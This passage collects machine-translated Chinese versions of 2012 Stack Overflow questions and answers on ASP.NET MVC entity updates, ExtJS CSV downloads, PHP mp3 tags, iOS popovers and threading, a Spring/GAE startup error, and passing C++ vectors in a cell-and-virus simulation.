        if (collection["Tool.Company.CompanyID"] != "")
        {
            tool.Company = context.Companies.Find(
                 Convert.ToInt32(collection["Tool.Company.CompanyID"])
            );
        }

        if (ModelState.IsValid)
        {
            context.Entry(tool).State = EntityState.Modified; 
            context.SaveChanges();
            return RedirectToAction("Index");
        }

        return View(tool);
    } 
```

前两个`if`语句检查用户是否输入了个人或公司，信息通过 FormCollection 传递。PersonID 和 CompanyID 分别是 Person 和 Company 的主键。我多次逐行执行该方法并获得相同的结果 - 在 context.SaveChanges(); 之后，上下文反映了更改，但 Person_PersonID 和 Company_CompanyID 的数据库条目仍然为空。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:09:38.743

在用户提交表单后尝试使用视图模型并访问数据库。

这应该会让你顺利上路。

视图模型

```
using System.ComponentModel.DataAnnotations;

namespace Project.ViewModels
{
    public class _tools
    {
        [Required(ErrorMessage="ToolID is required")]
        public int32 ToolID{ get; set; } //whatever ID you use to retrieve the Tool from the database.

        [Required(ErrorMessage="PersonID is required")]
        public int32 PersonID{ get; set; }

        [Required(ErrorMessage="CompanyID is required")]
        public int32 CompanyID{ get; set; }
    } 
```

}

控制器岗位

```
[HttpPost]
public ActionResult Edit(_tool viewModel)
{

    if (ModelState.IsValid)
    {
        Tool tool = db.GetTool(viewModel.ToolID) //whatever method you use to get a current version of the row.  You already do this before you send the data to the client, so just copy that code

        tool.Person = viewModel.PersonID
        tool.Company = viewModel.CompanyID

        context.Entry(tool).State = EntityState.Modified; 
        context.SaveChanges();
        return RedirectToAction("Index");
    }

    return View(tool);
} 
```

看法

```
@model = _tool

@using(Html.BeginForm("Edit", "ControllerNameHere", FormMethod.Post, null))
{
    @Html.HiddenFor(model => model.ToolID)
    @*Also add whatever inputs you use to get PersonID and CompanyID from the user.
      Make sure to either use the @Html helpers or to give them names that correspond.
      i.e. name one input PersonID and the other CompanyID*@

    <input type="submit" value="Edit">

} 
```

# java - 如何遍历直线上的点？

> ID：11782851
> 
> 赞同：2
> 
> 时间：2012-08-02T17:36:58.483
> 
> 标签：java

有没有办法遍历java 2D中一条线上的所有点？

我查看了类文档，看不到它内置的任何内容。如果没有，扩展类并编写我自己的方法来计算线的方程然后遍历每个点会更好吗？（这实际上是否可以作为一条线的理论方程和它实际绘制的像素似乎略有不同）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:41:27.193

听起来你正试图沿着边界框的线做一些事情。本质上，你应该在你的精灵周围有一个假想的盒子。然后只需检查边界框何时与线相交。当它发生时，你将你的精灵向相反的方向移动。

[这个关于游戏开发堆栈交换的问题应该会有所帮助。](https://gamedev.stackexchange.com/questions/7890/2d-object-aligned-bounding-box-intersection-test)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T18:03:43.913

对于以恒定速度沿直线运动的物体，其坐标是时间的仿射函数：

```
x(t) = vx*t + x0
y(t) = vy*t + y0 
```

其中`(vx,vy)` 是恒定速度（或速度）矢量和`(x0,y0)`原点位置（在时间 0）。

[我建议阅读一些关于运动学](http://en.wikipedia.org/wiki/Kinematic_equation#Equations_of_uniformly_accelerated_motion)的基本入门课程

因此，您可能不想“在线迭代”而只是在屏幕上移动某些东西，即在每个时间段计算其位置。

^(（我在法国的高中就学过这样的方程式）)

# php - 表单文件中上传的 mp3 的标题

> ID：11782855
> 
> 赞同：-4
> 
> 时间：2012-08-02T17:37:11.137
> 
> 标签：php, javascript

> **可能重复：**
> [读取文件的元数据](https://stackoverflow.com/questions/8862645/reading-a-files-metadata)

我有这个表格，我正在上传 mp3 文件，但我希望用户上传音乐，并且所有详细信息，如 mp3 的作者、标题等都应该自动填写在表单字段中。我正在使用 php，并且想要任何可以找到的 php/javascript 方法来自本地机器的文件的名称，并将该名称放在我的表单标题字段中，我的表单如下所示。我不希望用户输入标题、作者等

```
<form enctype="multipart/form-data" method="post" action="http://youshare.ca/music/writestorypost"><p><span class="form_label">Name of the song</span><input type="text" value="" name="title" style="width:400px" class="inputText required"></p><p><span class="form_label">Description</span>
<textarea class="rich" style="width:580px" rows="18" name="form_content"></textarea>
</p><p><span class="form_label">Tags</span>
    <input type="text" value="" style="width:300px" name="tags" class="inputText">
    <span>Multiple tags should be Separated with commas(,)</span>
    </p>
        <p><label>Upload</label><input type="file" name="song">
        <span>Only mp3 is accepted</span></p>
        <p><label>Music source</label>
        <input type="radio" checked="1" value="own" name="musicsource">My own 
        <input type="radio" value="others" name="musicsource">From another musician
        </p>
        <div style="display:none" id="ms_others">
        <p><label>Musician name</label><input name="musician"></p>
        </div>
        <div id="ms_own">
        <p></p>
        </div>
        <p><label>Picture (Optional)</label><input type="file" name="picture">
        <span>A picture about the song or the musician</span></p>
        <script type="text/javascript">
    jQuery(document).ready(function($) {
        $("input[value='own']").click(
            function() {
            $("#ms_others").hide();
            $("#ms_own").fadeIn();
            }
            );
      $("input[value='others']").click(
            function() {
            $("#ms_own").hide();
            $("#ms_others").fadeIn();
            }
            );
    })
  </script><p><input type="submit" value="Submit" class="button"></p><input type="hidden" value="935" name="page_id"></form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:13:56.983

上传文件后，您需要填写 MP3 的详细信息，除非他们手动输入所有信息。

在 PHP 端，您可以安装以下内容：[PHP ID3](http://php.net/manual/en/book.id3.php)

那里有关于如何从文件中读取 ID3 标签的示例。

# ajax - Extjs 4（下面有 3.4 的代码）下载从 post 请求返回的文件

> ID：11782856
> 
> 赞同：4
> 
> 时间：2012-08-02T17:37:10.717
> 
> 标签：ajax, extjs, extjs4, download, http-post

我已经看到与此略有相关的问题，但没有一个可以回答我的问题。我已经设置了一个 Ext.Ajax.request 如下：

```
var paramsStringVar = 'param1=1&param2=two&param3=something&param4=etc';

Ext.Ajax.request({
  url: '/cgi-bin/url.pl',
  method:'POST',
  params:paramsStringVar,
  timeout:120000,
  success: function(response, opts){
    var objhtml = response.responseText; //content returned from server side
    console.log(objhtml);
  }

}); 
```

此请求从后端检索适当的内容。一个参数是 outputType，它可以取值 {html, excel, csv}。返回 html 以显示时，我能够正确处理和显示它。现在说问题...

当我将 outputType 参数设置为 csv 或 excel 时，我会根据要求将适当的内容作为 csv 或 tsv(excel) 取回。但是，我不想要内容，我想要提示下载文件（csv 或 excel）。如何让浏览器自动提示用户下载文件，而不仅仅是检索 extjs 中的文本内容？

版本 4.07，所以我不能使用任何 4.1 唯一的功能

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T20:19:42.917

似乎没有防弹解决方案，但我会尝试几种方法：

**1)**使用`iframe`而不是真正的 XHR 将数据发布到服务器，例如隐藏 iframe的`<form action="/something" target="myiframe">`位置在哪里。这样，您的表单将使用 iframe（而不是您的主窗口）将数据提交到配置的 URL。您的服务器应将响应标头设置为（或二进制数据的其他 MIME 类型），以便浏览器触发下载。否则（如果在您的情况下返回 html），您只需检索 iframe 的正文 innerHTML 并在 UI 中将其显示给用户。虽然使用 iframe（或新窗口）而不是 XHR 听起来不是最好的主意，但这个解决方案似乎是迄今为止最可靠的（并且具有最好的浏览器支持）。`myiframe``name``application/octet-stream`

[这是来自Ext.form.Basic](http://docs.sencha.com/ext-js/4-0/#!/api/Ext.form.Basic)文档页面的稍微修改的示例：

```
Ext.create('Ext.form.Panel', {
    title: 'Basic Form',
    renderTo: Ext.getBody(),
    width: 350,

    // Any configuration items here will be automatically passed along to
    // the Ext.form.Basic instance when it gets created.

    // *THIS* makes the form use a standard submit mechanism, not XHR
/**/standardSubmit: true,

    // URL to submit to
    url: 'save-form.php',

    items: [{
        fieldLabel: 'Field',
        xtype: 'textfield',
        name: 'theField'
    }],

    buttons: [{
        text: 'Submit',
        handler: function() {
            // The getForm() method returns the Ext.form.Basic instance:
            var form = this.up('form').getForm();
            if (form.isValid()) {
                // Submit the Ajax request and handle the response
                form.submit({
                    success: function(form, action) {
                       Ext.Msg.alert('Success', action.result.msg);
                    },
                    failure: function(form, action) {
                        Ext.Msg.alert('Failed', action.result.msg);
                    },

                    // You can put the name of your iframe here instead of _blank
                    // this parameter makes its way to Ext.form.Basic.doAction() 
                    // and further leads to creation of StandardSubmit action instance
/**/                target: '_blank'                        
                });
            }
        }
    }]
}); 
```

这里有两个关键参数（标有 的行`/**/`）：

1.  `standardSubmit: true`您传递给表单的配置将使其执行标准提交而不是 XHR。
2.  将参数传递`target`给表单的*提交*操作。此功能未记录，但您可以在[Ext.form.action.Submit](http://docs.sencha.com/ext-js/4-0/source/Submit.html#Ext-form-action-Submit)源代码中看到它正在使用（您传递给[Ext.form.Basic.submit()](http://docs.sencha.com/ext-js/4-0/#!/api/Ext.form.Basic-method-submit)方法的所有选项最终都作为 Ext.form.action 的参数。 * 实例。

在示例代码中，我`target: '_blank'`展示了它可以立即工作（将创建一个新的浏览器窗口）。您可以稍后将其替换为 iframe 的名称，但我建议您首先测试表单如何将数据提交到常规新窗口，然后开发创建和处理 iframe 的逻辑。想着，您将不得不自己在 iframe 中处理结果。没那么难，看[Ext.data.Connection.upload()](http://docs.sencha.com/ext-js/4-0/source/Connection.html#Ext-data-Connection-method-upload)实现作为 iframe 处理的例子。

ExtJS 实际上已经使用了`iframe`文件**上传**技术。请参阅[Ext.data.Connection](http://docs.sencha.com/ext-js/4-0/#!/api/Ext.data.Connection)和[Ext.form.field.Field.isFileUpload()](http://docs.sencha.com/ext-js/4-0/#!/api/Ext.form.field.Field-method-isFileUpload)了解它是如何工作的。

**2)**此处建议：[使用 HTML5/Javascript 生成和保存文件](https://stackoverflow.com/questions/2897619/using-html5-javascript-to-generate-and-save-a-file)。

如果您不想采用 iframe 方式，可以尝试从响应数据生成*数据 URI*并导航到该 URI 触发下载：

```
content = "Hello world!";
uriContent = "data:application/octet-stream," + encodeURIComponent(content);
window.location.href = uriContent; 
```

同样，mimetype 在这里是必不可少的。这对我有用，但是您应该注意，浏览器对数据 URI 施加了大小限制（256Kb 是一个安全的选择）。

**3)**提到的线程中的另一个答案链接到[FileSaver.js](https://github.com/eligrey/FileSaver.js)库，该库实现了（被放弃的？）w3 规范。用法和演示[在这里](http://eligrey.com/blog/post/saving-generated-files-on-the-client-side)。它使用 [BlobBuilder] 生成二进制数据块，进一步用于使用多种方法之一初始化下载。尽管此解决方案似乎可行，但它使用了已弃用的 API，并且可能不会面向未来。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-07T19:56:43.860

下面是我的解决方案。这就是我目前的工作方式。响应根据文本/csv 的响应类型生成下载/打开提示。请注意，不需要 iFrame 或对 iframe 的引用。我花了很多时间来解决对 iFrame 的需求，这实际上破坏了我的解决方案。生成下载提示不需要 iFrame。需要的是与此类似的请求（提交），以及生成带有 text/csv 响应标头的适当 csv 的后端。

```
var hiddenForm = Ext.create('Ext.form.Panel', {
  title:'hiddenForm',
  standardSubmit: true,
  url: /cgi-bin/url.pl
  timeout: 120000,
  height:0,
  width: 0,
  hidden:true,
  items:[
    {xtype:'hiddenField', name:'field1', value:'field1Value'},
    // additional fields
  ]
})

hiddenForm.getForm().submit() 
```

标准提交行至关重要

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-13T05:22:22.277

您无需创建表单面板并将其隐藏在您的 extjs 文件中。我们可以添加一个 html 表单，然后单击 extjs 文件中的按钮，我们可以使用 url 提交表单。这适用于 IE 和 chrome 浏览器。下面是我尝试过的代码，它工作正常，

```
<form action="<%=fullURL%>/DownloadServlet.do" method="get" id="downloadForm"   name="downloadForm" target="_self">
</form>

click: 
  {
     fn: function()
    { 
       document.getElementById('downloadForm').submit();    
    }
  } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-24T09:29:11.780

要让它在 ExtJS 3.4 上运行：

```
 var hiddenForm = new Ext.FormPanel({
            id:'hiddenForm',
            region: 'south',
            method: 'POST',
            url: "/cgi/test.wsgi",
            height: 0,
            standardSubmit: true,
            hidden:true,
            items:[
                {xtype:'hidden', name:'p', value:p},
                {xtype:'hidden', name:'g', value:g},
                // ...
            ],
        });

        linkThis = new Ext.Button({
            text: 'Download this CSV',
            handler: function() {
                hiddenForm.getForm().submit();
            },
            maxHeight: 30,
        }); 
```

请记住，为了使其正常工作，您应该将 hiddenForm 放在任何容器中（即在按钮的同一个 Ext.Window 中），例如：

```
 risultatiWindow = new Ext.Window({
            title: 'CSV Export',
            height: 400,
            width: 500,
            ....
            items: [...., hiddenForm]
 }); 
```

# objective-c - 在有多个传出 segue 时在视图控制器之间传输数据

> ID：11782857
> 
> 赞同：0
> 
> 时间：2012-08-02T17:37:19.917
> 
> 标签：objective-c, view, uipopover

我正在为 iPad 制作记分牌应用程序。该应用程序包含一个包含五名玩家和十二轮的网格图形。我只是为要输入的每个分数创建了 UITextField。这些文本字段对象中的每一个都可以很容易地求和，每个玩家都会有一个总分。玩家根据他们的分数进行排名。正如我所解释的那样，我的应用程序已完成。然而，当试图让它更先进时，我遇到了问题。假设我想输入玩家 1 的第一轮得分。当我单击网格的那个框时，我希望出现一个 UIPopover。弹出窗口会弹出一个用于确定分数的特殊计算器。我希望将计算器的结果传输回我最初单击的框。当“计算分数”时，我无法解除 UIPopover 按钮被按下。如果我使用dismiss popover 方法，我可以将特定的 scoreBox 设置为计算器的结果，但是我需要让dismiss popover 方法知道它应该更改哪个框。基本上我有一个包含 60 个框的网格，每个框都连接到一个计算器视图控制器。我如何让该计算器将数据传输回它来自的盒子？有什么想法吗？谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:44:38.100

在显示之前，`UIPopoverViewController`您应该设置一个`box`引用当前框的属性。然后，您可以在关闭弹出框之前`UIPopoverViewController`设置文本。`box`

# objective-c - UIImage 的后台线程返回结果为 nil

> ID：11782860
> 
> 赞同：0
> 
> 时间：2012-08-02T17:37:25.343
> 
> 标签：objective-c, ios, cocoa-touch, core-data, magicalrecord

这仅在此应用程序运行中创建条目时发生。如果之前创建了条目，它会很好地获取图像。

这段代码在不使用后台线程的情况下工作正常，所以它让我相信它是问题的一部分。这是我的代码：

```
NSMutableDictionary *thumbnails = [[NSMutableDictionary alloc] init];

            dispatch_queue_t thumbnailSetupQueue = dispatch_queue_create("com.App.SetupTimelineThumbnails", NULL);
            dispatch_async(cellSetupQueue, ^{

                NSManagedObjectContext *newMoc = [[NSManagedObjectContext alloc] init];
                NSPersistentStoreCoordinator *coordinator = [NSManagedObjectContext contextForCurrentThread].persistentStoreCoordinator;
                [newMoc setPersistentStoreCoordinator:coordinator];

                NSNotificationCenter *notify = [NSNotificationCenter defaultCenter];
                [notify addObserver:self
                           selector:@selector(mergeChanges:)
                               name:NSManagedObjectContextDidSaveNotification
                             object:newMoc];

                Media *media = [localEntry.media anyObject];

                UIImage *image = [media getThumbnail];

                NSLog(@"image: %@", image);

                [[NSNotificationCenter defaultCenter] removeObserver:self];
            });

            dispatch_release(cellSetupQueue); 
```

然后

```
-(UIImage *)getThumbnail {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *fullPath = [documentsDirectory stringByAppendingPathComponent:
                          [NSString stringWithFormat:@"%@-%@.jpg",
                           self.mediaID,
                           THUMBNAIL_FILENAME]];

    UIImage *thumbnail = [UIImage imageWithContentsOfFile:fullPath];

    NSLog(@"correct size thumbnail: %@", correctSizeThumbnail);

    return correctSizeThumbnail;

} 
```

getThumbnailWithSave 中的 NSLog 以 UIImage 形式返回，其他 NSLog 以 nil 形式返回。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T19:07:35.407

我很久以前就解释过这个问题，我***认为***这就是我解决它的方法。

调用 getThumbnail 需要在主线程上回调。

所以添加一些东西，比如：

```
UIImage *image;
dispatch_async(dispatch_get_main_queue(), ^{
    image = [media getThumbnail];
}); 
```

或者

```
UIImage *image = [media performSelectorOnMainThread:@selector(getThumbnail) withObject: nil, waitUntilDone:NO]; 
```

这又是我的想法，但我很确定这就是我的做法。

# java - Spring 和 GAE：ExceptionInInitializerError

> ID：11782864
> 
> 赞同：0
> 
> 时间：2012-08-02T17:37:41.133
> 
> 标签：java, spring, google-app-engine

我现在一般来说是 Spring、GAE 和 Java。我正在尝试使用我为 Spring 制作的 Web 应用程序，之后我添加了 GAE 支持。我经历了很多问题，但现在我被困在这个问题上。

`Aug 2, 2012 3:52:40 PM org.springframework.web.context.ContextLoader initWebApplicationContext SEVERE: Context initialization failed java.lang.ExceptionInInitializerError at org.springframework.context.support.AbstractRefreshableApplicationContext.createBeanFactory(AbstractRefreshableApplicationContext.java:194) at org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:127) at org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:467) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:397) at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:276) at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:197) at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47) at org.mortbay.jetty.handler.ContextHandler.startContext(ContextHandler.java:548) at org.mortbay.jetty.servlet.Context.startContext(Context.java:136) at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1250) at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:517) at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:467) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130) at org.mortbay.jetty.Server.doStart(Server.java:224) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at com.google.appengine.tools.development.JettyContainerService.startContainer(JettyContainerService.java:197) at com.google.appengine.tools.development.AbstractContainerService.startup(AbstractContainerService.java:241) at com.google.appengine.tools.development.DevAppServerImpl.start(DevAppServerImpl.java:148) at com.google.appengine.tools.development.DevAppServerMain$StartAction.apply(DevAppServerMain.java:259) at com.google.appengine.tools.util.Parser$ParseResult.applyArgs(Parser.java:48) at com.google.appengine.tools.development.DevAppServerMain.<init>(DevAppServerMain.java:162) at com.google.appengine.tools.development.DevAppServerMain.main(DevAppServerMain.java:138) Caused by: java.lang.NullPointerException at org.springframework.beans.factory.support.DefaultListableBeanFactory.<clinit>(DefaultListableBeanFactory.java:104) ... 25 more Aug 2, 2012 3:52:40 PM com.google.apphosting.utils.jetty.JettyLogger warn WARNING: failed com.google.appengine.tools.development.DevAppEngineWebAppContext@327124af{/,C:\Users\SolarBear\Desktop\myProject\myProjectService2\war}: java.lang.ExceptionInInitializerError Aug 2, 2012 3:52:40 PM com.google.apphosting.utils.jetty.JettyLogger warn WARNING: failed JettyContainerService$ApiProxyHandler@3b19e583: java.lang.ExceptionInInitializerError Aug 2, 2012 3:52:40 PM com.google.apphosting.utils.jetty.JettyLogger warn WARNING: Error starting handlers java.lang.ExceptionInInitializerError at org.springframework.context.support.AbstractRefreshableApplicationContext.createBeanFactory(AbstractRefreshableApplicationContext.java:194) at org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:127) at org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:467) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:397) at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:276) at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:197) at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47) at org.mortbay.jetty.handler.ContextHandler.startContext(ContextHandler.java:548) at org.mortbay.jetty.servlet.Context.startContext(Context.java:136) at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1250) at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:517) at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:467) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130) at org.mortbay.jetty.Server.doStart(Server.java:224) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at com.google.appengine.tools.development.JettyContainerService.startContainer(JettyContainerService.java:197) at com.google.appengine.tools.development.AbstractContainerService.startup(AbstractContainerService.java:241) at com.google.appengine.tools.development.DevAppServerImpl.start(DevAppServerImpl.java:148) at com.google.appengine.tools.development.DevAppServerMain$StartAction.apply(DevAppServerMain.java:259) at com.google.appengine.tools.util.Parser$ParseResult.applyArgs(Parser.java:48) at com.google.appengine.tools.development.DevAppServerMain.<init>(DevAppServerMain.java:162) at com.google.appengine.tools.development.DevAppServerMain.main(DevAppServerMain.java:138) Caused by: java.lang.NullPointerException at org.springframework.beans.factory.support.DefaultListableBeanFactory.<clinit>(DefaultListableBeanFactory.java:104) ... 25 more Aug 2, 2012 3:52:40 PM com.google.apphosting.utils.jetty.JettyLogger warn WARNING: Nested in java.lang.ExceptionInInitializerError: java.lang.NullPointerException at org.springframework.beans.factory.support.DefaultListableBeanFactory.<clinit>(DefaultListableBeanFactory.java:104) at org.springframework.context.support.AbstractRefreshableApplicationContext.createBeanFactory(AbstractRefreshableApplicationContext.java:194) at org.springframework.context.support.AbstractRefreshableApplicationContext.refreshBeanFactory(AbstractRefreshableApplicationContext.java:127) at org.springframework.context.support.AbstractApplicationContext.obtainFreshBeanFactory(AbstractApplicationContext.java:467) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:397) at org.springframework.web.context.ContextLoader.createWebApplicationContext(ContextLoader.java:276) at org.springframework.web.context.ContextLoader.initWebApplicationContext(ContextLoader.java:197) at org.springframework.web.context.ContextLoaderListener.contextInitialized(ContextLoaderListener.java:47) at org.mortbay.jetty.handler.ContextHandler.startContext(ContextHandler.java:548) at org.mortbay.jetty.servlet.Context.startContext(Context.java:136) at org.mortbay.jetty.webapp.WebAppContext.startContext(WebAppContext.java:1250) at org.mortbay.jetty.handler.ContextHandler.doStart(ContextHandler.java:517) at org.mortbay.jetty.webapp.WebAppContext.doStart(WebAppContext.java:467) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at org.mortbay.jetty.handler.HandlerWrapper.doStart(HandlerWrapper.java:130) at org.mortbay.jetty.Server.doStart(Server.java:224) at org.mortbay.component.AbstractLifeCycle.start(AbstractLifeCycle.java:50) at com.google.appengine.tools.development.JettyContainerService.startContainer(JettyContainerService.java:197) at com.google.appengine.tools.development.AbstractContainerService.startup(AbstractContainerService.java:241) at com.google.appengine.tools.development.DevAppServerImpl.start(DevAppServerImpl.java:148) at com.google.appengine.tools.development.DevAppServerMain$StartAction.apply(DevAppServerMain.java:259) at com.google.appengine.tools.util.Parser$ParseResult.applyArgs(Parser.java:48) at com.google.appengine.tools.development.DevAppServerMain.<init>(DevAppServerMain.java:162) at com.google.appengine.tools.development.DevAppServerMain.main(DevAppServerMain.java:138) Aug 2, 2012 3:52:40 PM com.google.appengine.tools.development.DevAppServerImpl start INFO: The server is running at http://localhost:8888/ Aug 2, 2012 3:52:40 PM com.google.appengine.tools.development.DevAppServerImpl start INFO: The admin console is running at http://localhost:8888/_ah/admin`

我意识到我的上下文没有正确初始化，但由于这是由 Spring 直接管理的，我不知道如何解决这个问题。我不确定我应该给你什么信息，所以这里有一些重要的文件。

web.xml

```
<?xml version="1.0" encoding="utf-8" standalone="no"?><web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="2.5" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">
    <servlet>
        <servlet-name>mvc-dispatcher</servlet-name>
        <servlet-class>
                    org.springframework.web.servlet.DispatcherServlet
                </servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>mvc-dispatcher</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/mvc-dispatcher-servlet.xml</param-value>
    </context-param>

    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
    </welcome-file-list>

    <!-- Creates the Spring Container shared by all Servlets and Filters -->
    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>
<!-- 
 <servlet>
  <servlet-name>SystemServiceServlet</servlet-name>
  <servlet-class>com.google.api.server.spi.SystemServiceServlet</servlet-class>
  <init-param>
   <param-name>services</param-name>
   <param-value/>
  </init-param>
 </servlet>

 <servlet-mapping>
  <servlet-name>SystemServiceServlet</servlet-name>
  <url-pattern>/_ah/spi/*</url-pattern>
 </servlet-mapping>

-->

</web-app> 
```

mvc-调度程序-servlet.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans:beans xmlns="http://www.springframework.org/schema/mvc"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:beans="http://www.springframework.org/schema/beans"
    xmlns:context="http://www.springframework.org/schema/context"
    xsi:schemaLocation="http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd
        http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd">

    <!-- DispatcherServlet Context: defines this servlet's request-processing infrastructure -->

    <!-- Enables the Spring MVC @Controller programming model -->
    <annotation-driven />
    <context:component-scan base-package="com.sixisolution.togethrservice" />

    <!-- Handles HTTP GET requests for /resources/** by efficiently serving up static resources in the ${webappRoot}/resources directory -->
    <resources mapping="/resources/**" location="/resources/" />

    <!-- Resolves views selected for rendering by @Controllers to .jsp resources in the /WEB-INF/views directory -->
    <beans:bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <beans:property name="prefix" value="/WEB-INF/views/" />
        <beans:property name="suffix" value=".jsp" />
    </beans:bean>

</beans:beans> 
```

感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:07:14.033

从我在这里看到的配置文件中。一切看起来都很好。异常表示初始化错误，有时会发生在属性文件或构造函数无法初始化的情况下。你能根据这里的配置文件验证一下吗？

`<resources mapping="/resources/**" location="/resources/" />`

已配置并准备就绪？？我在 src 下有我的属性文件夹，它被编译到输出目录。

堆栈跟踪中的另一件事是 DefaultListableBeanFactory 异常初始化问题。请验证您的类路径中是否有正确版本的 spring Jar 文件。

# c++ - 仅通过代码中的某些函数传递向量

> ID：11782866
> 
> 赞同：0
> 
> 时间：2012-08-02T17:37:41.717
> 
> 标签：c++, function, vector

我在 C++ 中无效的环境函数中创建了一个向量调用 nucleus 和 cell。然后我调用创建病毒点向量的病毒函数。然后我想在病毒调用的另一个函数中访问向量核和细胞。是否可以不通过病毒函数调用病毒？如果不是，最好的方法是什么？附上我的代码。先谢谢了。另外我没有在函数中添加所有代码......

```
 struct point {
        float x;
        float y;
    };
    struct space{
        point point1;
        point point2;
        point point3;
        point point4;
    };

        int gelato(vector<point> & virus,int& times,int& iv, ofstream& data_file)
    {
        int a;
        int b;

        bool nc,cc,cmc;
        for(int i =0; i<virus.size(); i++)
        {
             a = virus[i].x;
             b = virus[i].y;

            nc = nucleus_check(nucleus,a,b); // **Need to call vector cell and nucleus**
            cc = cytoplasm_check(cell,a,b);
            cmc = cell_membrane_check(cell,a,b);
        }
    }

int moves(char n)
{
    int moved;
    int trial;

    if( n =='A')
    {
        moved = rand()%4;
    }
    else if(n=='B')
    {
        moved= rand()%3+1;
    }
    else if(n=='C')
    {
        trial= rand()%4;
        if(trial ==1)
        {
            moves('C');
        }
        else
        {
            moved = trial;
        }
    }
    else if(n =='D')
    {
        trial = rand()%4;
        if(trial == 2)
        {
            moves('D');
        }
        else
        {
            moved = trial;
        }
    }
    else if(n=='E')
    {
        moved = rand()%3;
    }

    return moved;
}   
int v_move(vector<point>& virus, int& iv, ofstream& data_file)
{

        gelato(virus,times,iv,data_file);
}
int rand_in(char a)
{}
void virus( ofstream& data_file)
{

    v_move(virus, iv, data_file);
}
void cell_space(int r)
{

    vector<point>cell;
}
void nucleus_space(int r)
{

    vector<point>nucleus;
}   

void environment() //**Where the vector nucleus and cell are created**
{
    //cell
    cell_space(16)

    //nucleus
    nucleus_space(4);
    //cout<<"Environment"<<endl;
}
int main()
{
    srand(time(NULL));
    data_file.open("data.csv");
    environment();
    virus(data_file);

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:35:04.430

我假设您尚未学习/掌握面向对象编程 (OOP)，并且您想使用[过程编程范式](http://en.wikipedia.org/wiki/Procedural_programming)来实现您的程序。这很好，因为 C++ 支持多种范式并且不会强迫您使用 OOP。

由于“细胞空间”和“细胞核空间”旨在作为您称为“环境”的实体一起使用，因此您应该定义一个`environment`结合两者的结构：

```
struct environment
{
    vector<point> cells;
    vector<point> nuclei;
}; 
```

准备环境的函数如下所示：

```
